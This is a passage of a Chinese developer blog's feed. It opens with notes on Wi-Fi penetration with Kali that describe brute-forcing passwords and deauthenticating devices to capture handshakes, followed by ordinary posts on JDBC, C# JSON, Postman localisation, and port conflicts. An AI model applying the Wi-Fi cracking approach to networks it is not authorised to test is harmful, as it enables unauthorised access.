中文汉化免安装![image.png](https://upload-images.jianshu.io/upload_images/2815884-25f2e812d34f61e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)字典生成的不说了,kali有命令..linux好久没玩了```sudo su``` 切换超级用户 需要输入系统密码.```passwd``` 在su模式下可以修改密码以后执行```su```输入密码就行了kali安装的时候有一个设备路径必须选择,否则开启启动就黑屏.关于虚拟机问题也有很多,15蓝屏,修复蓝屏又导致另外一个问题,反正就是一个死循环了,后面升级15搞定了.最后关于密码穷举的问题普及一下,一种就是一个一个的连接尝试,这样非常慢,2秒尝试一个密码,这个window用python脚本就行还有一种就是抓用户握手包,踢下线就能抓了,但是不是什么路由器都能查看到设备,或者能踢下线的.抓到了加密包,就需要穷举了,速度比那个还要好一点下图可以看出来基本上看不到设备数..![image.png](https://upload-images.jianshu.io/upload_images/2815884-39f3cf94809b828a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)抓包和基本字典测试.![xxx.png](https://upload-images.jianshu.io/upload_images/2815884-9b0ecacf7c758bbd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/d1edd39f3d2f&quot;&gt;无线渗透之kali笔记&lt;/a&gt;&lt;br&gt;文章字数：1542,阅读全文大约需要6分钟&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;t
      
    
    </summary>
    
      <category term="逆向与安全" scheme="https://lozn.top/categories/%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="逆向与安全" scheme="https://lozn.top/tags/%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>坑爹奇葩的jdbcgetColumnNameindex竟然从1开始</title>
    <link href="https://lozn.top/2021/12/13/%E5%9D%91%E7%88%B9%E5%A5%87%E8%91%A9%E7%9A%84jdbc-getColumnName(index)%E7%AB%9F%E7%84%B6%E4%BB%8E1%E5%BC%80%E5%A7%8B/"/>
    <id>https://lozn.top/2021/12/13/坑爹奇葩的jdbc-getColumnName(index)竟然从1开始/</id>
    <published>2021-12-13T08:11:40.000Z</published>
    <updated>2022-06-30T02:06:23.271Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/7054ac5bbd2d">坑爹奇葩的jdbcgetColumnNameindex竟然从1开始</a><br>文章字数：185,阅读全文大约需要1分钟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Get the designated column&#x27;s name.</span><br><span class="line"> *</span><br><span class="line"> * @param column the first column is 1, the second is 2, ...</span><br><span class="line"> * @return column name</span><br><span class="line"> * @exception SQLException if a database access error occurs</span><br><span class="line"> */</span><br><span class="line">String getColumnName(int column) throws SQLException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Get the designated column&#x27;s table&#x27;s schema.</span><br><span class="line"> *</span><br><span class="line"> * @param column the first column is 1, the second is 2, ...</span><br><span class="line"> * @return schema name or &quot;&quot; if not applicable</span><br><span class="line"> * @exception SQLException if a database access error occurs</span><br><span class="line"> */</span><br><span class="line">String getSchemaName(int column) throws SQLException;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Return the column descriptor given a column index.</span><br><span class="line"> *</span><br><span class="line"> * @param column The column index (from 1 .. n).</span><br><span class="line"> * @return The column descriptor as a &lt;code&gt;ColInfo&lt;code&gt;.</span><br><span class="line"> * @throws SQLException</span><br><span class="line"> */</span><br><span class="line">ColInfo getColumn(int column) throws SQLException &#123;</span><br><span class="line">    if (column &lt; 1 || column &gt; columnCount) &#123;</span><br><span class="line">        throw new SQLException(</span><br><span class="line">                Messages.get(&quot;error.resultset.colindex&quot;,</span><br><span class="line">                        Integer.toString(column)), &quot;07009&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return columns[column - 1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我本来是写的从1开始的，后面写webapi我自己都纳闷，额，我怎么给写成1了，怎么这么低级的错误，我就把哪个地方改成了0 ，把&lt;&#x3D;count 改成count,然后切换为jdbc模式的时候出错了，坑爹，坑爹，必须记录下来，搞得我改过来改过去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">while (resultSet.next()) &#123;</span><br><span class="line">          ResultSetMetaData rsMetaData = resultSet.getMetaData();</span><br><span class="line">          //检索列名列表</span><br><span class="line">          LinkedHashMap&lt;String, Object&gt; hashMap = new LinkedHashMap&lt;&gt;();</span><br><span class="line">          int count = rsMetaData.getColumnCount();</span><br><span class="line">          keymaploop:</span><br><span class="line">          for (int i = 1; i &lt;= count; i++) &#123;// getColumn 从1 开始</span><br><span class="line">              String columnName = rsMetaData.getColumnName(i);</span><br><span class="line">              int columnType = rsMetaData.getColumnType(i);</span><br><span class="line">              Object object = null;</span><br><span class="line">              if (columnType == Types.VARBINARY) &#123;</span><br><span class="line">                  object = resultSet.getBinaryStream(columnName);</span><br><span class="line">              &#125; else if (columnType == Types.CLOB) &#123;</span><br><span class="line">                  Clob clob = resultSet.getClob(columnName);</span><br><span class="line">                  object = ClobToString(clob);</span><br><span class="line">              &#125; else if (columnType == Types.BLOB) &#123;</span><br><span class="line">                  Blob blob = resultSet.getBlob(columnName);</span><br><span class="line">                  if (blob != null) &#123;</span><br><span class="line">                      object = blob.getBinaryStream();</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                  object = resultSet.getObject(columnName);</span><br><span class="line">              &#125;</span><br><span class="line">              if (onlyOneColumn) &#123;</span><br><span class="line">                  String result = String.valueOf(object == null ? &quot;&quot; : object);</span><br><span class="line">                  if (!TextUtils.isEmpty(result)) &#123;</span><br><span class="line">                      list.add(result);</span><br><span class="line">                  &#125;</span><br><span class="line">                  break keymaploop;//只查询一列作为list</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                  if (object instanceof InputStream) &#123;</span><br><span class="line">                      hashMap.put(columnName, new JDBCWrapper.InputStreamWrap((InputStream) object, columnName));</span><br><span class="line">                  &#125; else if (object instanceof Array) &#123;</span><br><span class="line">                      hashMap.put(columnName, object);</span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                      hashMap.put(columnName, String.valueOf(object == null ? &quot;&quot; : object));</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          if (!onlyOneColumn) &#123;</span><br><span class="line">              list.add(hashMap);//否则返回一个字符串list</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除此之外，注册输出函数第一个index&#x3D;1是返回值，也是从1开始的，就问奇葩不奇葩。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/7054ac5bbd2d&quot;&gt;坑爹奇葩的jdbcgetColumnNameindex竟然从1开始&lt;/a&gt;&lt;br&gt;文章字数：185,阅读全文大约需要1分钟&lt;/p&gt;
&lt;figure class=&quot;hi
      
    
    </summary>
    
      <category term="c#" scheme="https://lozn.top/categories/c/"/>
    
    
      <category term="c#" scheme="https://lozn.top/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>aspnetcore跨平台webapi探索之路</title>
    <link href="https://lozn.top/2021/12/11/asp-net-core%E8%B7%A8%E5%B9%B3%E5%8F%B0-webapi%E6%8E%A2%E7%B4%A2%E4%B9%8B%E8%B7%AF/"/>
    <id>https://lozn.top/2021/12/11/asp-net-core跨平台-webapi探索之路/</id>
    <published>2021-12-11T01:12:55.000Z</published>
    <updated>2022-06-30T02:06:23.255Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/723e70c642f0">aspnetcore跨平台webapi探索之路</a><br>文章字数：0,阅读全文大约需要1分钟</p><pre><code></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/723e70c642f0&quot;&gt;aspnetcore跨平台webapi探索之路&lt;/a&gt;&lt;br&gt;文章字数：0,阅读全文大约需要1分钟&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;

      
    
    </summary>
    
      <category term="c#" scheme="https://lozn.top/categories/c/"/>
    
    
      <category term="c#" scheme="https://lozn.top/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>原创postman最新版手动汉化方法自力更新办法</title>
    <link href="https://lozn.top/2021/12/11/%5B%E5%8E%9F%E5%88%9B%5Dpostman%E6%9C%80%E6%96%B0%E7%89%88%E6%89%8B%E5%8A%A8%E6%B1%89%E5%8C%96%E6%96%B9%E6%B3%95-%E8%87%AA%E5%8A%9B%E6%9B%B4%E6%96%B0%E5%8A%9E%E6%B3%95/"/>
    <id>https://lozn.top/2021/12/11/[原创]postman最新版手动汉化方法-自力更新办法/</id>
    <published>2021-12-11T01:05:56.000Z</published>
    <updated>2022-06-30T02:06:23.247Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/85ce85655085">原创postman最新版手动汉化方法自力更新办法</a><br>文章字数：375,阅读全文大约需要1分钟<br>C:\Users\qssq5\AppData\Local\Postman\app-9.4.0\resources<br>中解压app.asar</p><p><code>npm install -g asar asar extract 压缩文件  解压文件夹 </code></p><p><code>asar pack 文件夹  压缩文件名</code><br>解压改名文件夹为app文件夹<br>C:\Users\qssq5\AppData\Local\Postman\app-9.4.0\resources\app</p><p>如C:\Users\qssq5\AppData\Local\Postman\app-9.4.0\resources\app\js\scratchpad\vendor-shared.js</p><p>其中label都是代表可以汉化的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">ActiveWorkspaceStore&quot;).id,n=Object(T.getSessionId)(U.COLLECTION,this.collectionId,t);return Object(w.getStore)(&quot;PermissionStore&quot;).can(&quot;edit&quot;,&quot;collection&quot;,this.collectionId)?O.default.get(&#123;id:n&#125;).then((r=&gt;&#123;if(r)return Object(_.default)(Object(S.createEvent)(&quot;update&quot;,U.AUTH_SESSION,e.assign(&#123;&#125;,e.cloneDeep(r),&#123;value:Object(v.toJS)(this.authSession)&#125;)));if(!e.isEmpty(this.authSession))&#123;const e=&#123;id:n,model:U.COLLECTION,modelId:this.collectionId,workspace:t,value:Object(v.toJS)(this.authSession)&#125;;return Object(_.default)(Object(S.createEvent)(&quot;create&quot;,U.AUTH_SESSION,e))&#125;&#125;)):Promise.resolve()&#125;unsetContext(e)&#123;this.additionalContext&amp;&amp;delete this.additionalContext[e]&#125;getActions()&#123;const e=Object(w.getStore)(&quot;PermissionStore&quot;),t=Object(w.getStore)(&quot;CurrentUserStore&quot;),n=Object(w.getStore)(&quot;ActiveWorkspaceStore&quot;).id,r=Object(w.getStore)(&quot;ForkedCollectionStore&quot;).find(this.uid),i=Boolean(r&amp;&amp;r.id),&#123;userCanSave:a,userCanSaveAndSync:o&#125;=Object(w.getStore)(&quot;OnlineStatusStore&quot;);return[&#123;type:L.ACTION_TYPE_FORK,label:&quot;创建一个分叉&quot;,isEnabled:o,xpathLabel:&quot;fork&quot;&#125;,&#123;type:L.ACTION_TYPE_PULL_REQUEST,label:&quot;创建拉取请求&quot;,isEnabled:o&amp;&amp;i,xpathLabel:&quot;pull-request&quot;&#125;,&#123;type:L.ACTION_TYPE_MERGE,label:&quot;合并变更&quot;,isEnabled:o&amp;&amp;i,xpathLabel:&quot;merge&quot;&#125;,&#123;type:L.ACTION_TYPE_PULL_CHANGES,label:&quot;拉取更改&quot;,isEnabled:o&amp;&amp;this.isFork&amp;&amp;this.userCanPullChanges&amp;&amp;this.isOutOfSync,xpathLabel:&quot;pull-changes&quot;,userCanPullChanges:this.userCanPullChanges,isFork:this.isFork,isOutOfSync:this.isOutOfSync&#125;,&#123;type:L.ACTION_TYPE_DOWNLOAD,label:&quot;导出&quot;,isEnabled:!0,xpathLabel:&quot;export&quot;&#125;,&#123;type:L.ACTION_MANAGE_ROLES,label:&quot;管理角色&quot;,isEnabled:o&amp;&amp;!!t.team,xpathLabel:&quot;manageRoles&quot;&#125;,&#123;type:L.ACTION_REMOVE_FROM_WORKSPACE,label:&quot;从工作区中移除&quot;,isEnabled:o&amp;&amp;e.can(&quot;removeCollection&quot;,&quot;workspace&quot;,n),xpathLabel:&quot;remove&quot;&#125;,&#123;type:L.ACTION_TYPE_DELETE,label:&quot;删除&quot;,shortcut:&quot;delete&quot;,isEnabled:a&amp;&amp;e.can(&quot;delete&quot;,&quot;collection&quot;,this.collectionId),xpathLabel:&quot;delete&quot;&#125;]&#125;&#125;,y.editableKeys=[&quot;auth&quot;,&quot;preRequestScript&quot;,&quot;tests&quot;,&quot;variables&quot;,&quot;protocolProfileBehavior&quot;],i=B((r=b).prototype,&quot;isFork&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:function()&#123;return!1&#125;&#125;),a=B(r.prototype,&quot;isOutOfSync&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:function()&#123;return!1&#125;&#125;),o=B(r.prototype,&quot;userCanPullChanges&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:function()&#123;return!0&#125;&#125;),s=B(r.prototype,&quot;name&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:null&#125;),l=B(r.prototype,&quot;activeTab&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:function()&#123;return C.COLLECTION_AUTHORIZATION&#125;&#125;),c=B(r.prototype,&quot;team&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:function()&#123;return null&#125;&#125;),u=B(r.prototype,&quot;watchersCount&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:function()&#123;return 0&#125;&#125;),d=B(r.prototype,&quot;isWatching&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:function()&#123;return!1&#125;&#125;),p=B(r.prototype,&quot;isWatchDisabled&quot;,[v.observable],&#123;configurable:!0,enumerable:!0,writable:!0,initializer:function()&#123;return!1&#125;&#125;),h=B(r.prototype,&quot;isWatchersLoading&quot;,[v.observable],&#123;configurable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/2815884-def570b274c7f813.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>如果不需要用解压的方式，可以直接再打包成asar<br><img src="https://upload-images.jianshu.io/upload_images/2815884-ae06afc3e60deb41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/2815884-aabf8f53d8f1d7ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/85ce85655085&quot;&gt;原创postman最新版手动汉化方法自力更新办法&lt;/a&gt;&lt;br&gt;文章字数：375,阅读全文大约需要1分钟&lt;br&gt;C:\Users\qssq5\AppData\Loca
      
    
    </summary>
    
      <category term="逆向与安全" scheme="https://lozn.top/categories/%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="逆向与安全" scheme="https://lozn.top/tags/%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>idea单独运行main方法</title>
    <link href="https://lozn.top/2021/12/10/idea%E5%8D%95%E7%8B%AC%E8%BF%90%E8%A1%8Cmain%E6%96%B9%E6%B3%95/"/>
    <id>https://lozn.top/2021/12/10/idea单独运行main方法/</id>
    <published>2021-12-10T08:16:53.000Z</published>
    <updated>2022-06-30T02:06:23.259Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/b46aa5ad9f30">idea单独运行main方法</a><br>文章字数：12,阅读全文大约需要1分钟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by qssq on 2017/12/4 qssq521@gmail.com</span><br><span class="line"> * idea test main method  ,idea/gradle.xml add        &lt;option name=&quot;delegatedBuild&quot; value=&quot;false&quot; /&gt;</span><br><span class="line"> */</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/b46aa5ad9f30&quot;&gt;idea单独运行main方法&lt;/a&gt;&lt;br&gt;文章字数：12,阅读全文大约需要1分钟&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="android" scheme="https://lozn.top/categories/android/"/>
    
    
      <category term="android" scheme="https://lozn.top/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>原创CJSON节点的替换整体套路</title>
    <link href="https://lozn.top/2021/12/09/%5B%E5%8E%9F%E5%88%9B%5DC#-JSON%E8%8A%82%E7%82%B9%E7%9A%84%E6%9B%BF%E6%8D%A2%E6%95%B4%E4%BD%93%E5%A5%97%E8%B7%AF/"/>
    <id>https://lozn.top/2021/12/09/[原创]C#-JSON节点的替换整体套路/</id>
    <published>2021-12-09T07:49:57.000Z</published>
    <updated>2022-06-30T02:06:23.247Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/889e43790916">原创CJSON节点的替换整体套路</a><br>文章字数：62,阅读全文大约需要1分钟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">private static void replaceSelfJSONFromChild()</span><br><span class="line">        &#123;</span><br><span class="line">            string groupJSON = &quot;&#123;\&quot;zone\&quot;:\&quot;海淀\&quot;,\&quot;zone_en\&quot;:\&quot;haidian\&quot;,&#x27;location&#x27;:&#123;x:1,y:2&#125;&#125;&quot;;</span><br><span class="line">            Newtonsoft.Json.Linq.JObject groupJSONObject = (Newtonsoft.Json.Linq.JObject)Newtonsoft.Json.JsonConvert.DeserializeObject(groupJSON);</span><br><span class="line">            JObject locationObject=(JObject)groupJSONObject.GetValue(&quot;location&quot;);</span><br><span class="line"></span><br><span class="line">            string replaceJSON = &quot;&#123;x:5,y:6&#125;&quot;;</span><br><span class="line">            Newtonsoft.Json.Linq.JObject willReplaceJSON = (Newtonsoft.Json.Linq.JObject)Newtonsoft.Json.JsonConvert.DeserializeObject(replaceJSON);</span><br><span class="line">            locationObject.RemoveAll();</span><br><span class="line">            locationObject.Merge(willReplaceJSON);</span><br><span class="line">            Console.WriteLine(&quot;JSON:&quot; + groupJSONObject);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        private static void replaceSelfJSON()</span><br><span class="line">        &#123;</span><br><span class="line">            string jsonText = &quot;&#123;\&quot;zone\&quot;:\&quot;海淀\&quot;,\&quot;zone_en\&quot;:\&quot;haidian\&quot;&#125;&quot;;</span><br><span class="line">            Newtonsoft.Json.Linq.JObject jo = (Newtonsoft.Json.Linq.JObject)Newtonsoft.Json.JsonConvert.DeserializeObject(jsonText);</span><br><span class="line">            string jsonText111 = &quot;&#123;\&quot;zone\&quot;:\&quot;海淀333\&quot;,\&quot;zone_en\&quot;:\&quot;haidian\&quot;&#125;&quot;;</span><br><span class="line">            Newtonsoft.Json.Linq.JObject jo1 = (Newtonsoft.Json.Linq.JObject)Newtonsoft.Json.JsonConvert.DeserializeObject(jsonText111);</span><br><span class="line">            jo.RemoveAll();</span><br><span class="line">            jo.Merge(jo1);</span><br><span class="line">            Console.WriteLine(&quot;JSON:&quot; + jo);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static void removeSelfChildJSON()</span><br><span class="line">        &#123;</span><br><span class="line">            string groupJSON = &quot;&#123;\&quot;zone\&quot;:\&quot;海淀\&quot;,\&quot;zone_en\&quot;:\&quot;haidian\&quot;,&#x27;location&#x27;:&#123;x:1,y:2&#125;&#125;&quot;;</span><br><span class="line">            Newtonsoft.Json.Linq.JObject groupJSONObject = (Newtonsoft.Json.Linq.JObject)Newtonsoft.Json.JsonConvert.DeserializeObject(groupJSON);</span><br><span class="line">            JObject locationObject = (JObject)groupJSONObject.GetValue(&quot;location&quot;);</span><br><span class="line"></span><br><span class="line">            //locationObject.RemoveAll();</span><br><span class="line"></span><br><span class="line">            ((JObject)locationObject.Parent.Parent).Remove(&quot;location&quot;);</span><br><span class="line">            //locationObject.Merge(willReplaceJSON);</span><br><span class="line">            Console.WriteLine(&quot;JSON:&quot; + groupJSONObject);</span><br><span class="line">        &#125;</span><br><span class="line">        private static void removeSelfChildArray()</span><br><span class="line">        &#123;</span><br><span class="line">            string groupJSON = &quot;[&quot; +</span><br><span class="line">                &quot;&#123; &#x27;name&#x27;:&#x27;luo&#x27;,&#x27;y&#x27;:2,&#x27;location&#x27;:&#123;z:1,n:5&#125; &#125; &quot; +</span><br><span class="line">                         &quot;,&#123; &#x27;name&#x27;:&#x27;zheng&#x27;,&#x27;y&#x27;:2,&#x27;location&#x27;:&#123;z:1,n:5&#125; &#125; &quot; +</span><br><span class="line">                                    &quot;,&#123; &#x27;name&#x27;:&#x27;ye&#x27;,&#x27;y&#x27;:2,&#x27;location&#x27;:&#123;z:1,n:5&#125; &#125; &quot; +</span><br><span class="line">                &quot;]&quot;;</span><br><span class="line">            Newtonsoft.Json.Linq.JArray jarray = (Newtonsoft.Json.Linq.JArray)Newtonsoft.Json.JsonConvert.DeserializeObject(groupJSON);</span><br><span class="line"></span><br><span class="line">            JObject jobject = (JObject)jarray[0];</span><br><span class="line">            //jobject.Remove();</span><br><span class="line">            //((JArray)jobject.Parent).Remove(jobject);</span><br><span class="line">            ((JArray)jobject.Parent).RemoveAt(0);</span><br><span class="line">            //locationObject.RemoveAll();</span><br><span class="line">            Console.WriteLine(&quot;JSON:&quot; + jobject + &quot;,removeAfter&quot; + jarray);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/889e43790916&quot;&gt;原创CJSON节点的替换整体套路&lt;/a&gt;&lt;br&gt;文章字数：62,阅读全文大约需要1分钟&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;
      
    
    </summary>
    
      <category term="c#" scheme="https://lozn.top/categories/c/"/>
    
    
      <category term="c#" scheme="https://lozn.top/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>80端口被占用问题根源解决HTTPError404Therequestedresourceisnotfound</title>
    <link href="https://lozn.top/2021/12/09/80%E7%AB%AF%E5%8F%A3%E8%A2%AB%E5%8D%A0%E7%94%A8%E9%97%AE%E9%A2%98%E6%A0%B9%E6%BA%90%E8%A7%A3%E5%86%B3--HTTP-Error-404--The-requested-resource-is-not-found-/"/>
    <id>https://lozn.top/2021/12/09/80端口被占用问题根源解决--HTTP-Error-404--The-requested-resource-is-not-found-/</id>
    <published>2021-12-09T02:01:20.000Z</published>
    <updated>2022-06-30T02:06:23.239Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/2fa8cf7d3934">80端口被占用问题根源解决HTTPError404Therequestedresourceisnotfound</a><br>文章字数：88,阅读全文大约需要1分钟<br>停止iis,以及卸载了window自带的iis解决不了问题<br>查端口<br>使用<code>netstat|findstr 80</code> 以及<code>tasklist|findstr</code> 进程发现是4，网上说使用<code>net stop http</code> 依然不行，最后找到答案根据localhost打开的提示<code>HTTP Error 404. The requested resource is not found.</code>搜索问题说是sql server导致的</p><p>停止<code>SQL Server Reporting Services (MSSQLSERVER)</code>就可以解决问题，<br>或者输入<code>net stop ReportServer</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/2fa8cf7d3934&quot;&gt;80端口被占用问题根源解决HTTPError404Therequestedresourceisnotfound&lt;/a&gt;&lt;br&gt;文章字数：88,阅读全文大约需要1分钟&lt;
      
    
    </summary>
    
      <category term="c#" scheme="https://lozn.top/categories/c/"/>
    
    
      <category term="c#" scheme="https://lozn.top/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>修改textinputlayouthiit字体大小</title>
    <link href="https://lozn.top/2021/12/03/%E4%BF%AE%E6%94%B9textinputlayout-hiit-%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F/"/>
    <id>https://lozn.top/2021/12/03/修改textinputlayout-hiit-字体大小/</id>
    <published>2021-12-03T08:43:56.000Z</published>
    <updated>2022-06-30T02:06:23.271Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/24ffc89345f3">修改textinputlayouthiit字体大小</a><br>文章字数：21,阅读全文大约需要1分钟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    &lt;style name=&quot;textinput_layout_style_black_deep&quot; parent=&quot;Theme.MyApplication.App.NoActionBar&quot;&gt;</span><br><span class="line">        &lt;item name=&quot;boxStrokeWidth&quot;&gt;1dp&lt;/item&gt;</span><br><span class="line">        &lt;item name=&quot;hintTextAppearance&quot;&gt;@style/hintTextAppearance&lt;/item&gt;</span><br><span class="line">        &lt;item name=&quot;boxStrokeWidthFocused&quot;&gt;1dp&lt;/item&gt;</span><br><span class="line">        &lt;item 